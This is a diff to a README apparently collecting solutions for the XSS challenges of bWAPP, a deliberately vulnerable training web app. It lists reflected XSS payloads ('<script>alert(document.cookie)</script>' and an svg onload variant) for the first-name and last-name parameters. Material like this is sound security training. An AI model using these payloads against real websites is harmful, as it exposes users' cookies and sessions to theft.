@@ -2,7 +2,7 @@
 Welcome to the repository of comprehensive solutions for bWAPP's Cross-Site Scripting (XSS) challenges, meticulously curated and solved by BugBot19 (Nihar Rathod). This repository serves as a one-stop resource for anyone looking to understand and solve XSS vulnerabilities in the bWAPP (Buggy Web Application) framework.
 
 # XSS - Reflected (GET)(LOW)
-Payload- <script>alert(document.cookie)</script>(can be inserted in both parameter Firstname and lastname)
+``` Payload- <script>alert(document.cookie)</script>(can be inserted in both parameter Firstname and lastname) ```
 
 XSS - Reflected (GET)(MEDIUM) 
 Payload- <svg onload=alert(document.cookie)>(Can be inserted in both the parameter Firstname and Lastname)
